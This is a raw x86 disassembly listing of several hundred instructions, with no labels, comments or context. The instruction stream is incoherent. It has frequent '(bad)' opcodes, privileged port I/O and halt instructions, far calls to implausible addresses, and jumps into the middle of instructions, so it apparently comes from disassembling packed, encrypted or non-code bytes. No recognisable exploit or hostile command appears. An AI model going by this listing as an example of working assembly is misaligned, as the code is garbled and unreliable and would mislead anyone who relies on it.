  418c4b:	mov    esp,0xef557209
  418c50:	mov    ebx,0xde29e0ca
  418c55:	imul   ebx,DWORD PTR [ebx-0x66],0x3bcfc9c3
  418c5c:	or     ah,BYTE PTR [edx]
  418c5e:	test   al,0x51
  418c60:	and    DWORD PTR [ecx+0x2f04eda2],eax
  418c66:	popf   
  418c67:	add    eax,0x337a1d61
  418c6c:	xor    eax,0x9697745b
  418c71:	xor    DWORD PTR [edi],edx
  418c73:	push   edx
  418c74:	mov    dh,0x4b
  418c76:	dec    ebp
  418c77:	adc    esi,DWORD PTR [edi]
  418c79:	jnp    0x418c5b
  418c7b:	mov    eax,0xe6a3f052
  418c80:	pusha  
  418c81:	fisttp QWORD PTR [ebp-0x1]
  418c84:	cdq    
  418c85:	push   ebx
  418c86:	imul   eax,edx,0x51
  418c89:	rol    cl,1
  418c8b:	cmp    ch,BYTE PTR fs:[edi-0x72cf6d1e]
  418c92:	rcr    DWORD PTR [ebx-0x44],cl
  418c95:	in     eax,0x1b
  418c97:	inc    ebx
  418c98:	mov    ch,0xe1
  418c9a:	call   0xed29647f
  418c9f:	sub    BYTE PTR [eax-0x22458d3],0x36
  418ca6:	push   ebx
  418ca7:	or     al,0xa
  418ca9:	mov    dl,0xd
  418cab:	sahf   
  418cac:	call   0x74e49cc8
  418cb1:	fs jp  0x418c37
  418cb4:	call   0x1214:0xb176797f
  418cbb:	(bad)  
  418cbc:	repz cli 
  418cbe:	sti    
  418cbf:	jnp    0x418d24
  418cc1:	jg     0x418c4f
  418cc3:	pushf  
  418cc4:	sbb    al,0x96
  418cc6:	fcom   DWORD PTR fs:[esi-0x42]
  418cca:	arpl   WORD PTR [ecx+0x1f],di
  418ccd:	sub    DWORD PTR [edx-0x49e1a5b0],ebx
  418cd3:	cli    
  418cd4:	sub    BYTE PTR [ebx+0x5df7bf67],dh
  418cda:	xor    ch,bl
  418cdc:	scas   eax,DWORD PTR es:[edi]
  418cdd:	sub    al,0xfb
  418cdf:	push   edi
  418ce1:	retf   
  418ce2:	ss mov ebp,0x3ed3a31c
  418ce8:	pop    ecx
  418ce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cea:	or     al,0x26
  418cec:	nop
  418ced:	add    al,0x67
  418cef:	fistp  DWORD PTR ds:0x19057abb
  418cf5:	test   al,0x3f
  418cf7:	call   ecx
  418cf9:	xor    DWORD PTR [esi+edi*8+0x65],edx
  418cfd:	fcom   DWORD PTR [edi-0x4f]
  418d00:	aam    0x5c
  418d02:	jl     0x418c92
  418d04:	retf   
  418d05:	mov    ecx,0x63d61e31
  418d0a:	push   ebp
  418d0b:	mov    ebp,0x99a1ffba
  418d10:	sbb    DWORD PTR [esi],ecx
  418d12:	xor    ebx,DWORD PTR [edx-0x9]
  418d15:	dec    ebx
  418d16:	mov    dh,0x57
  418d18:	(bad)  
  418d1a:	js     0x418d30
  418d1c:	sbb    BYTE PTR [esi+0x32],dl
  418d1f:	gs shr bh,0x8
  418d23:	xor    eax,0x6dbbbc98
  418d28:	pop    es
  418d29:	dec    ecx
  418d2a:	adc    ebx,edx
  418d2c:	xchg   dx,ax
  418d2e:	inc    ah
  418d30:	outs   dx,DWORD PTR ds:[esi]
  418d31:	mov    bl,0x7a
  418d33:	pop    ds
  418d34:	dec    eax
  418d35:	shl    BYTE PTR [esp+ecx*2-0x1e86d7e8],0x57
  418d3d:	jne    0x418d39
  418d3f:	div    bl
  418d41:	out    0x69,eax
  418d43:	fisub  WORD PTR [ecx-0x34]
  418d46:	cmp    DWORD PTR [eax-0x69],ebx
  418d49:	sbb    BYTE PTR [ecx],cl
  418d4b:	and    eax,0xd19e3cd4
  418d50:	push   ds
  418d51:	nop
  418d52:	cmp    BYTE PTR [ebx],ah
  418d54:	mov    edx,0x52b56744
  418d59:	inc    edx
  418d5a:	inc    esp
  418d5b:	dec    esp
  418d5c:	ret    
  418d5d:	sub    al,0xcf
  418d5f:	dec    esp
  418d60:	mov    cl,dh
  418d62:	scas   al,BYTE PTR es:[edi]
  418d63:	mov    bl,0x5f
  418d65:	int3   
  418d66:	test   al,0xf8
  418d68:	sbb    DWORD PTR [ebx+0x2c04c7de],edx
  418d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d6f:	stos   BYTE PTR es:[edi],al
  418d70:	mov    DWORD PTR [ebx],ecx
  418d72:	arpl   WORD PTR [ebx],sp
  418d74:	inc    ebp
  418d75:	adc    ah,0x50
  418d78:	jmp    0x2d9f1f5c
  418d7d:	sub    cl,0x6b
  418d80:	aas    
  418d81:	mov    ebp,0x6a8fe68c
  418d86:	mov    bl,0xd8
  418d88:	sub    DWORD PTR [ebp+0x23],edx
  418d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d8c:	outs   dx,DWORD PTR ds:[esi]
  418d8d:	xor    ah,ch
  418d8f:	(bad)  
  418d90:	fcom   QWORD PTR [ecx-0x74373f4a]
  418d96:	inc    ebp
  418d97:	or     eax,0x358aced6
  418d9c:	ror    DWORD PTR ds:0x2a0291e1,1
  418da2:	adc    DWORD PTR ds:0x93614552,ebx
  418da8:	lods   eax,DWORD PTR ds:[esi]
  418da9:	mov    edx,0x5d5caf4c
  418dae:	enter  0x7b52,0x8d
  418db2:	mov    bh,0x6f
  418db4:	fisttp DWORD PTR ds:0x2089241b
  418dba:	je     0x418d74
  418dbc:	add    ebx,DWORD PTR ds:0xfb075ec6
  418dc2:	xor    eax,0x5de46568
  418dc7:	and    eax,0xf105797e
  418dcc:	(bad)  
  418dcd:	push   ecx
  418dce:	mov    eax,0x1244e1e4
  418dd3:	mov    ah,BYTE PTR [edx]
  418dd5:	xchg   esi,eax
  418dd6:	scas   al,BYTE PTR es:[edi]
  418dd7:	pop    eax
  418dd8:	pop    es
  418dd9:	xchg   edx,eax
  418dda:	js     0x418d8d
  418ddc:	add    ah,BYTE PTR [edx-0x2d2c6423]
  418de2:	xor    BYTE PTR [ecx+0x29],bl
  418de5:	sbb    BYTE PTR [edi+0x60],bl
  418de8:	loope  0x418de7
  418dea:	pop    esp
  418deb:	xchg   edi,eax
  418dec:	mov    cl,0x97
  418dee:	shr    DWORD PTR [esi],1
  418df0:	and    dl,al
  418df2:	jo     0x418db0
  418df4:	mov    eax,fs:0x3fe01b39
  418dfa:	sub    al,0xf5
  418dfc:	cld    
  418dfd:	fsub   QWORD PTR [edx-0x9c114f]
  418e03:	hlt    
  418e04:	add    BYTE PTR [eax],bl
  418e06:	dec    ebx
  418e07:	pop    edi
  418e08:	sub    dl,bl
  418e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e0b:	fcomp  st(0)
  418e0d:	mov    cl,0x76
  418e0f:	(bad)  
  418e10:	scas   eax,DWORD PTR es:[edi]
  418e11:	dec    esi
  418e12:	cli    
  418e13:	cdq    
  418e14:	and    esi,DWORD PTR [ecx+0x5d]
  418e17:	repnz sbb BYTE PTR [ebx],cl
  418e1a:	imul   edx,DWORD PTR [ebx],0x33
  418e1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e1e:	pop    edx
  418e1f:	dec    esp
  418e20:	push   es
  418e21:	out    0xb4,al
  418e23:	push   eax
  418e24:	dec    edi
  418e25:	lods   eax,DWORD PTR ds:[esi]
  418e26:	bound  edi,QWORD PTR [edx]
  418e28:	sbb    ah,BYTE PTR [ecx-0x4293410]
  418e2e:	mov    ebp,DWORD PTR ds:[esi+0x51]
  418e32:	fwait
  418e33:	es pop esp
  418e35:	stos   BYTE PTR es:[edi],al
  418e36:	or     ecx,DWORD PTR [ebx]
  418e38:	jp     0x418dfc
  418e3a:	jb     0x418e9c
  418e3c:	pop    ds
  418e3d:	jmp    0x418eae
  418e3f:	stc    
  418e40:	xor    edx,ebp
  418e42:	mov    bl,0x2
  418e44:	inc    edi
  418e45:	mov    al,ds:0x95d0c2e0
  418e4a:	push   ds
  418e4b:	jno    0x418e5e
  418e4d:	mov    ds:0x48228f93,al
  418e52:	or     eax,0x3ab67d9a
  418e57:	lods   eax,DWORD PTR ds:[esi]
  418e58:	retf   0x5b49
  418e5b:	cmp    al,0x41
  418e5d:	ins    BYTE PTR es:[edi],dx
  418e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e60:	push   ds
  418e61:	lock shl DWORD PTR [esi],0xdf
  418e65:	(bad)  
  418e66:	mov    esp,0x6863c763
  418e6b:	adc    BYTE PTR [esi+0x5a2a6b96],dl
  418e71:	xor    ecx,DWORD PTR [edi+edi*2]
  418e74:	jns    0x418e9c
  418e76:	(bad)  
  418e77:	cmp    esp,DWORD PTR [esi]
  418e79:	lock dec esp
  418e7b:	scas   eax,DWORD PTR es:[edi]
  418e7c:	hlt    
  418e7d:	repnz dec ecx
  418e7f:	dec    ebx
  418e80:	(bad)  
  418e81:	sbb    eax,0x475e83b2
  418e86:	cmp    DWORD PTR cs:[edi+0x1e5e38d],eax
  418e8d:	add    BYTE PTR [edi],0x9d
  418e90:	sub    eax,0x8a4971ca
  418e95:	in     al,dx
  418e96:	xor    esi,ecx
  418e98:	mov    eax,ds:0x88cb3eff
  418e9d:	je     0x418e44
  418e9f:	push   ebp
  418ea0:	ins    DWORD PTR es:[edi],dx
  418ea1:	and    al,0xba
  418ea3:	mov    dh,BYTE PTR [edx*2+0x76dbd6e9]
  418eaa:	jb     0x418ee2
  418eac:	add    BYTE PTR [ebp+edi*1+0x1a575015],0x19
  418eb4:	fnstsw WORD PTR [ebx-0x72ee4176]
  418eba:	sbb    DWORD PTR [ebx+esi*2-0x37],ebx
  418ebe:	in     eax,0x70
  418ec0:	scas   al,BYTE PTR es:[edi]
  418ec1:	sar    BYTE PTR [eax],1
  418ec3:	jne    0x418f16
  418ec5:	jne    0x418f28
  418ec7:	popf   
  418ec8:	push   0xc95651ef
  418ecd:	repz mov ebx,0xfd847fad
  418ed3:	mov    ds:0xe89e3277,eax
  418ed8:	mov    ds:0xc44cc7df,al
  418edd:	call   0x9ebd:0x278cb6a8
  418ee4:	(bad)  [edi-0x23a28d68]
  418eea:	clc    
  418eeb:	(bad)  
  418eec:	xchg   edi,eax
  418eed:	fucomp st(3)
  418eef:	(bad)  
  418ef0:	popf   
  418ef1:	es mov dl,0xf8
  418ef4:	mov    bh,0xc1
  418ef6:	pop    eax
  418ef7:	not    BYTE PTR [ecx]
  418ef9:	pop    ecx
  418efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418efb:	sbb    eax,0x1f71fbc7
  418f00:	das    
  418f01:	jb     0x418f4e
  418f03:	push   esp
  418f04:	xor    al,0x5
  418f06:	dec    ecx
  418f07:	jle    0x418f63
  418f09:	sbb    DWORD PTR [ebx-0xf],esi
  418f0c:	push   0xffffffe9
  418f0e:	mov    esi,0x64ca869a
  418f13:	xor    DWORD PTR ds:0xa59fd97,0xc6b7fa5
  418f1d:	test   BYTE PTR [edi],ch
  418f1f:	lock jo 0x418f05
  418f22:	ins    DWORD PTR es:[edi],dx
  418f23:	mov    esi,fs
  418f25:	mov    ch,0x64
  418f27:	sub    DWORD PTR [ebx+0x5a],eax
  418f2a:	mov    ecx,0xfc5e7954
  418f2f:	leave  
  418f30:	repnz mov edi,0x65880544
  418f36:	push   ebp
  418f37:	xor    BYTE PTR [edi+0x14],0xe9
  418f3b:	push   esp
  418f3c:	mov    dl,0xd5
  418f3e:	adc    BYTE PTR ds:0xa1dd847b,bl
  418f44:	xlat   BYTE PTR ds:[ebx]
  418f45:	(bad)  
  418f46:	out    dx,eax
  418f47:	pop    ebx
  418f48:	test   al,0xee
  418f4a:	pop    ds
  418f4b:	leave  
  418f4c:	addr16 add bh,dh
  418f4f:	jg     0x418f9f
  418f51:	xchg   esp,eax
  418f52:	int    0x99
  418f54:	adc    dh,cl
  418f56:	mov    bh,0xdf
  418f58:	or     DWORD PTR [ebp+0x25],edi
  418f5b:	mov    dh,0xd
  418f5d:	aam    0x35
  418f5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f60:	mov    bh,0xe4
  418f62:	int    0x19
  418f64:	adc    DWORD PTR [edi],0x68273331
  418f6a:	mov    ch,0x54
  418f6c:	xchg   edi,eax
  418f6d:	inc    eax
  418f6e:	mov    bl,0xca
  418f70:	sub    esi,eax
  418f72:	sbb    DWORD PTR [eax+0x7b82a159],ebx
  418f78:	loope  0x418f40
  418f7a:	cmc    
  418f7b:	xor    dh,BYTE PTR ds:0x9a063185
  418f81:	setl   BYTE PTR [ebx-0x731d87f7]
  418f88:	fcom   QWORD PTR [ebx]
  418f8a:	jae    0x418fd3
  418f8c:	loop   0x418f2b
  418f8e:	inc    esi
  418f8f:	enter  0x2b25,0xbc
  418f93:	cmp    edi,0x27
  418f96:	xchg   ecx,eax
  418f97:	loop   0x418fe1
  418f99:	outs   dx,DWORD PTR ds:[esi]
  418f9a:	inc    esi
  418f9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f9c:	rep stos DWORD PTR es:[edi],eax
  418f9e:	rol    BYTE PTR [esi+0x53612586],1
  418fa4:	xchg   edi,eax
  418fa5:	lods   al,BYTE PTR ds:[esi]
  418fa6:	(bad)  
  418fa7:	cwde   
  418fa8:	mov    DWORD PTR [ebp+0x7af133de],esi
  418fae:	icebp  
  418faf:	out    0x36,al
  418fb1:	(bad)  
  418fb2:	pop    ss
  418fb3:	out    dx,eax
  418fb4:	push   ds
  418fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fb7:	in     al,dx
  418fb8:	arpl   sp,dx
  418fba:	aaa    
  418fbb:	leave  
  418fbc:	into   
  418fbd:	lahf   
  418fbe:	daa    
  418fbf:	js     0x418fb0
  418fc1:	and    ebx,esp
  418fc3:	mov    ch,0x4c
  418fc5:	push   ebp
  418fc6:	mov    bl,0x65
  418fc8:	or     BYTE PTR [edx+0x69],0xc2
  418fcc:	cs sub dh,dl
  418fcf:	add    DWORD PTR [eax+0x1e],ebx
  418fd2:	cmp    esp,edi
  418fd4:	inc    esi
  418fd5:	cmp    BYTE PTR [edx],dl
  418fd7:	ins    DWORD PTR es:[edi],dx
  418fd8:	aam    0x6a
  418fda:	add    ebx,DWORD PTR [edi-0x6b]
  418fdd:	xchg   dl,ch
  418fdf:	hlt    
  418fe0:	stos   BYTE PTR es:[edi],al
  418fe1:	enter  0x7abd,0xc3
  418fe5:	cdq    
  418fe6:	nop
  418fe7:	fimul  DWORD PTR [ecx]
  418fe9:	nop
  418fea:	jae    0x418f8c
  418fec:	add    ebp,0x55957c6a
  418ff2:	jle    0x41902e
  418ff4:	aad    0x97
  418ff6:	out    dx,al
  418ff7:	adc    edi,DWORD PTR [esi-0x15]
  418ffa:	push   ebp
  418ffb:	test   DWORD PTR [eax+0x37],edi
  418ffe:	leave  
  418fff:	pusha  
  419000:	aaa    
  419001:	jg     0x41907a
  419003:	push   esp
  419004:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419006:	inc    ebx
  419007:	popa   
  419008:	out    0xef,eax
  41900a:	test   BYTE PTR [ebx+0x0],0x62
  41900e:	adc    eax,0xc286ffe2
  419013:	xor    BYTE PTR [ecx+0x28],dh
  419016:	xchg   ecx,eax
  419017:	mov    ah,0x6e
  419019:	popf   
  41901a:	inc    edi
  41901b:	push   cs
  41901c:	(bad)  
  41901d:	fld    DWORD PTR [ecx-0x26aa0ba2]
  419023:	test   BYTE PTR [edx+0x68],bl
  419026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419027:	pop    ss
  419028:	ins    BYTE PTR es:[edi],dx
  419029:	imul   edi,DWORD PTR [eax],0x8cdae220
  41902f:	lock in eax,0xf5
  419032:	and    ch,BYTE PTR [ebx+0xa]
  419035:	push   ebx
  419036:	inc    ebx
  419037:	mov    al,ds:0x64ef5abd
  41903c:	sbb    BYTE PTR [edx+0x7e252b],bl
  419042:	clc    
  419043:	inc    esp
  419044:	fimul  WORD PTR [edx-0x77]
  419047:	inc    eax
  419048:	aas    
  419049:	imul   ebp,DWORD PTR [ebp-0x24],0xffffffaa
  41904d:	mov    al,ds:0x11453ace
  419052:	adc    esi,DWORD PTR [esi+eiz*8]
  419055:	not    edi
  419057:	xchg   edx,eax
  419058:	stos   BYTE PTR es:[edi],al
  419059:	inc    ebx
  41905a:	jg     0x41904e
  41905c:	outs   dx,BYTE PTR ds:[esi]
  41905d:	or     dl,BYTE PTR [eax+eiz*1-0x74]
  419061:	mov    ebp,0xfbef84fe
  419066:	cmp    BYTE PTR [ebp-0x19ef645a],bl
  41906c:	dec    esp
  41906d:	out    0xdb,eax
  41906f:	inc    ebp
  419070:	dec    esi
  419071:	dec    eax
  419072:	jb     0x419094
  419074:	or     ch,dl
  419076:	fwait
  419077:	lods   al,BYTE PTR ds:[esi]
  419078:	ror    DWORD PTR [eax+eax*2+0x74],0xef
  41907d:	dec    ebx
  41907e:	sub    esp,DWORD PTR [ecx-0x53]
  419081:	std    
  419082:	pop    esp
  419083:	sub    esp,DWORD PTR [eax-0xf21edf2]
  419089:	mov    dh,0x6
  41908b:	std    
  41908c:	imul   edi,DWORD PTR [edx-0x37],0x79af094d
  419093:	jbe    0x41908a
  419095:	sub    esi,0x536e5370
  41909b:	pop    ds
  41909c:	push   esp
  41909d:	dec    BYTE PTR [edx]
  41909f:	int    0x44
  4190a1:	retf   
  4190a2:	cwde   
  4190a3:	dec    esp
  4190a4:	adc    ebx,DWORD PTR [edx-0xe]
  4190a7:	je     0x4190e3
  4190a9:	pop    es
  4190aa:	stos   BYTE PTR es:[edi],al
  4190ab:	pop    ebx
  4190ac:	das    
  4190ad:	clc    
  4190ae:	ret    
  4190af:	and    BYTE PTR [esi],0x18
  4190b2:	ret    0xb5b5
  4190b5:	ins    DWORD PTR es:[edi],dx
  4190b6:	add    DWORD PTR [ebx-0x59f1841b],ebp
  4190bc:	ret    0x7f1e
  4190bf:	cdq    
  4190c0:	mov    ah,0x23
  4190c2:	loope  0x4190ad
  4190c4:	in     al,0x6f
  4190c6:	mov    esp,0x94c31364
  4190cc:	dec    esp
  4190cd:	xor    DWORD PTR [edi],ecx
  4190cf:	and    eax,0x8ce83f6b
  4190d4:	retf   0x8485
  4190d7:	mov    cl,ah
  4190d9:	mov    WORD PTR [eax+ebp*2+0x482ae76d],gs
  4190e0:	hlt    
  4190e1:	pop    ebp
  4190e2:	pusha  
  4190e3:	add    bl,BYTE PTR [ebx-0xf]
  4190e6:	mov    esp,0x5425435c
  4190eb:	add    BYTE PTR [esi-0x33e12d3f],cl
  4190f1:	adc    al,0xa1
  4190f3:	jg     0x419132
  4190f5:	bound  esi,QWORD PTR [edx+edi*4]
  4190f8:	outs   dx,DWORD PTR ds:[esi]
  4190f9:	adc    al,0x59
  4190fb:	(bad)  
  4190fc:	mov    eax,0xb82d4c26
  419101:	fsub   DWORD PTR [ebx-0x23]
  419104:	fidiv  WORD PTR [edi-0x5e4a7ea5]
  41910a:	xor    dl,dh
  41910c:	pop    edx
  41910d:	ret    0x6d99
  419110:	dec    ecx
  419111:	ret    
  419112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419113:	jae    0x4190e4
  419115:	cdq    
  419116:	ror    BYTE PTR [ebx+ebp*4+0x63016239],1
  41911d:	push   ebx
  41911e:	mov    ds:0xe8641248,eax
  419123:	hlt    
  419124:	dec    edi
  419125:	cld    
  419126:	mov    ah,0x99
  419128:	fsubr  QWORD PTR [eax+0x18]
  41912b:	xchg   DWORD PTR [ecx+esi*1+0x12341896],edi
  419132:	jg     0x419187
  419134:	mov    cl,0xd
  419136:	clc    
  419137:	popf   
  419138:	les    edx,FWORD PTR ds:0x2e1beec1
  41913e:	jne    0x4191a3
  419140:	repnz inc ebx
  419142:	pop    ss
  419143:	mov    ecx,0xb663254a
  419148:	sbb    dl,BYTE PTR [ebx]
  41914a:	xor    ecx,esi
  41914c:	xor    cl,dh
  41914e:	dec    ebp
  41914f:	cmp    dh,ah
  419151:	clc    
  419152:	ins    DWORD PTR es:[edi],dx
  419153:	(bad)  
  419154:	pop    es
  419155:	sub    al,0xb
  419157:	adc    al,0xc3
  419159:	and    al,0x3f
  41915b:	jmp    0x41912a
  41915d:	ficom  DWORD PTR [ebx-0xa]
  419160:	mov    ch,0xe6
  419162:	bound  ebx,QWORD PTR [ecx+0x1a1a8625]
  419168:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41916a:	jecxz  0x41911b
  41916c:	jmp    0x41910b
  41916e:	adc    al,0xda
  419170:	aad    0x86
  419172:	scas   eax,DWORD PTR es:[edi]
  419173:	cli    
  419174:	jecxz  0x4191e4
  419176:	test   al,al
  419178:	adc    bl,bl
  41917a:	xlat   BYTE PTR ds:[ebx]
  41917b:	sub    eax,0x3c90df6f
  419180:	inc    esi
  419181:	sub    dl,ah
  419183:	add    cl,BYTE PTR [edi+0x1]
  419186:	xlat   BYTE PTR ds:[ebx]
  419187:	inc    esi
  419188:	xchg   esi,eax
  419189:	pop    ebp
  41918a:	test   dh,dh
  41918c:	add    eax,0x7aeaa6a3
  419191:	mov    WORD PTR [esi+0x1a],ss
  419194:	pop    edi
  419195:	(bad)  
  419196:	push   ebp
  419197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419198:	ins    DWORD PTR es:[edi],dx
  419199:	cmp    bh,ah
  41919b:	retf   0xb53c
  41919e:	mov    esi,0xcdbacdd8
  4191a3:	jle    0x419215
  4191a5:	inc    edx
  4191a6:	and    DWORD PTR [ebx+0x78],esi
  4191a9:	push   edi
  4191aa:	adc    BYTE PTR [edi-0x17eeba5],dl
  4191b0:	mov    ?,WORD PTR [edi+0x7e]
  4191b3:	fcom   DWORD PTR [ecx]
  4191b5:	loope  0x41915c
  4191b7:	cmp    ebx,DWORD PTR [edx+0x18]
  4191ba:	push   edx
  4191bb:	fs sub al,0x43
  4191be:	sub    esi,DWORD PTR [edx]
  4191c0:	enter  0x550e,0x17
  4191c4:	mov    ebx,0x61fd2695
  4191c9:	hlt    
  4191ca:	stos   DWORD PTR es:[edi],eax
  4191cb:	jo     0x419227
  4191cd:	xchg   BYTE PTR [edi-0x54d51a68],dh
  4191d3:	pop    edi
  4191d4:	push   0x69
  4191d6:	rcl    DWORD PTR [eax-0x38b93b0f],0x75
  4191dd:	or     cl,ch
  4191df:	sub    al,BYTE PTR [esi]
  4191e1:	aas    
  4191e2:	xlat   BYTE PTR ds:[ebx]
  4191e3:	sbb    esp,DWORD PTR ds:0xaae28336
  4191e9:	inc    esp
  4191ea:	stos   DWORD PTR es:[edi],eax
  4191eb:	xchg   DWORD PTR [ebp-0x11],ebp
  4191ee:	daa    
  4191ef:	jbe    0x4191d8
  4191f1:	cmp    esp,ecx
  4191f3:	shr    BYTE PTR [ecx-0x49],cl
  4191f6:	mov    al,0x38
  4191f8:	stc    
  4191f9:	mov    esi,edi
  4191fb:	jo     0x4191dd
  4191fd:	add    BYTE PTR [ecx+0x23492454],dl
  419203:	loop   0x4191a7
  419205:	(bad)  
  419206:	callw  0x59e8
  41920a:	fdiv   st,st(7)
  41920c:	popf   
  41920d:	ss retf 0x8092
  419211:	aaa    
  419212:	pop    edx
  419213:	add    eax,0xe181822f
  419218:	and    BYTE PTR [eax+0x1b],ah
  41921b:	ins    BYTE PTR es:[edi],dx
  41921c:	jns    0x4191ec
  41921e:	inc    eax
  41921f:	pop    ebp
  419220:	cld    
  419221:	and    bp,WORD PTR [ebp+eiz*8-0xc]
  419226:	aad    0x9e
  419228:	adc    eax,0x7a7163bd
  41922d:	cli    
  41922e:	jb     0x419216
  419230:	aaa    
  419231:	ins    DWORD PTR es:[edi],dx
  419232:	retf   
  419233:	mov    ebx,0x3c73b1f2
  419238:	test   eax,0x22db01ff
  41923d:	add    al,al
  41923f:	daa    
  419240:	loope  0x4191cc
  419242:	in     al,0x73
  419244:	rol    BYTE PTR [edx],cl
  419246:	jg     0x4191d0
  419248:	mov    bl,0x13
  41924a:	adc    DWORD PTR [ebx+0x16],edi
  41924d:	icebp  
  41924e:	loope  0x419251
  419250:	adc    bl,al
  419252:	or     al,0x7
  419254:	lock std 
  419256:	jae    0x41921e
  419258:	scas   eax,DWORD PTR es:[edi]
  419259:	add    eax,0x11c409ed
  41925e:	jle    0x41923c
  419260:	pop    esi
  419261:	stc    
  419262:	xchg   ecx,ebx
  419264:	pop    ebx
  419265:	add    BYTE PTR [ebp+0x2956834a],dl
  41926b:	lods   al,BYTE PTR ds:[esi]
  41926c:	mov    ebp,DWORD PTR [eax+0xec150ff]
  419272:	xorps  xmm1,XMMWORD PTR [edx+0x7067b6a8]
  419279:	pop    edx
  41927a:	data16 test al,0x0
  41927d:	or     DWORD PTR [ebx-0x1515ab76],ebx
  419283:	pop    ebp
  419284:	mov    ch,0x7d
  419286:	retf   
  419287:	add    ecx,eax
  419289:	rcl    BYTE PTR [esi+eax*1],0x8e
  41928d:	fs jne 0x4192db
  419290:	cmp    BYTE PTR [ebx+0x3a9bc9a4],al
  419296:	adc    DWORD PTR [ebx-0x52880b02],eax
  41929c:	(bad)  
  41929e:	add    al,0x12
  4192a0:	jg     0x41925f
  4192a2:	mov    DWORD PTR [eax],esp
  4192a4:	mov    BYTE PTR [edi+ecx*4-0x5d126335],ch
  4192ab:	mov    ebx,0x9998b703
  4192b0:	adc    edi,ebp
  4192b2:	mov    ebp,DWORD PTR [edi]
  4192b4:	scas   eax,DWORD PTR es:[edi]
  4192b5:	cwde   
  4192b6:	js     0x419241
  4192b8:	sti    
  4192b9:	dec    eax
  4192ba:	je     0x4192db
  4192bc:	aas    
  4192bd:	leave  
  4192be:	ins    BYTE PTR es:[edi],dx
  4192bf:	pop    eax
  4192c0:	inc    esp
  4192c1:	lods   eax,DWORD PTR ds:[esi]
  4192c2:	cmp    eax,0x21494c29
  4192c7:	cmp    al,0x78
  4192c9:	xchg   esp,eax
  4192ca:	dec    bx
  4192cc:	cmp    eax,0x50f84c82
  4192d1:	inc    edi
  4192d2:	fld    DWORD PTR [edi+0x6912581d]
  4192d8:	mov    al,ds:0x886b39c3
  4192dd:	(bad)  
  4192de:	(bad)  
  4192df:	jl     0x419307
  4192e1:	dec    ebp
  4192e2:	ins    DWORD PTR es:[edi],dx
  4192e3:	lods   eax,DWORD PTR ds:[esi]
  4192e4:	jns    0x4192bd
  4192e6:	outs   dx,BYTE PTR ds:[esi]
  4192e7:	fsub   st,st(5)
  4192e9:	pop    ds
  4192ea:	fstp   DWORD PTR [eax+0x70]
  4192ed:	or     eax,0x43bf4318
  4192f2:	pushf  
  4192f3:	mov    BYTE PTR [eax-0x7e],dl
  4192f6:	pop    eax
  4192f7:	out    dx,al
  4192f8:	sbb    eax,DWORD PTR [edi+eax*2]
  4192fb:	cmp    DWORD PTR [ebx-0x3e],ecx
  4192fe:	das    
  4192ff:	pop    ecx
  419300:	leave  
  419301:	retf   0x91bd
  419304:	fcom   DWORD PTR [eax]
  419306:	push   es
  419307:	jno    0x4192db
  419309:	jle    0x41928f
  41930b:	sub    edi,DWORD PTR [ecx-0x60733f88]
  419311:	push   ds
  419312:	push   0xaa2000a2
  419317:	cmp    dl,al
  419319:	nop
  41931a:	add    al,0xa3
  41931c:	adc    eax,DWORD PTR [ebx-0x4c]
  41931f:	pop    edi
  419320:	rcl    DWORD PTR [ebx-0x49ff21f8],0x12
  419327:	(bad)  
  419328:	xchg   ecx,eax
  419329:	in     eax,dx
  41932a:	mov    ch,0x8e
  41932c:	sub    al,0x3c
  41932e:	or     eax,0xb4eaf9b7
  419333:	pop    ds
  419334:	in     al,dx
  419335:	rcl    DWORD PTR [ebx+ebx*1],0x7a
  419339:	inc    ebx
  41933a:	rcr    BYTE PTR [ebp-0x45d6d503],1
  419340:	in     eax,dx
  419341:	scas   al,BYTE PTR es:[edi]
  419342:	scas   eax,DWORD PTR es:[edi]
  419343:	lock scas eax,DWORD PTR es:[edi]
  419345:	sbb    BYTE PTR [ebp-0xc],dl
  419348:	loop   0x4192cb
  41934a:	into   
  41934b:	imul   ebp,edx,0x78e637be
  419351:	push   ebp
  419352:	jge    0x4193bb
  419354:	mov    ds:0xf1642788,al
  419359:	add    al,BYTE PTR [eax+esi*8]
  41935c:	jae    0x4192de
  41935e:	inc    edx
  41935f:	or     al,BYTE PTR [esi+0x74837817]
  419365:	adc    BYTE PTR [edi-0xd],cl
  419368:	adc    esi,DWORD PTR [edx+0x63]
  41936b:	adc    DWORD PTR [ebp+0x54],eax
  41936e:	out    0xc5,eax
  419370:	(bad)  
  419371:	out    dx,eax
  419372:	or     eax,0xa8193c33
  419377:	cmp    bh,BYTE PTR ds:0x50a2af48
  41937d:	loopne 0x4193f5
  41937f:	(bad)  
  419380:	or     DWORD PTR [esi+0x36c95e8c],edi
  419386:	jb     0x41934d
  419388:	pop    eax
  419389:	cmp    ecx,edx
  41938b:	and    BYTE PTR ds:0x70492da6,dh
  419391:	nop
  419392:	lods   eax,DWORD PTR ds:[esi]
  419393:	stos   BYTE PTR es:[edi],al
  419394:	adc    al,0x88
  419396:	icebp  
  419397:	js     0x419333
  419399:	dec    esp
  41939a:	and    DWORD PTR ds:0xcb3f383f,esi
  4193a0:	idiv   esi
  4193a2:	fidivr WORD PTR [ecx-0x1b]
  4193a5:	mov    dh,0x19
  4193a7:	xchg   ebx,eax
  4193a8:	les    edx,FWORD PTR [ebp-0x1]
  4193ab:	or     al,BYTE PTR [eax+edx*1+0x3d]
  4193af:	mov    BYTE PTR ds:0xcdfacc9,bl
  4193b5:	jmp    0x41938c
  4193b7:	dec    eax
  4193b8:	(bad)  
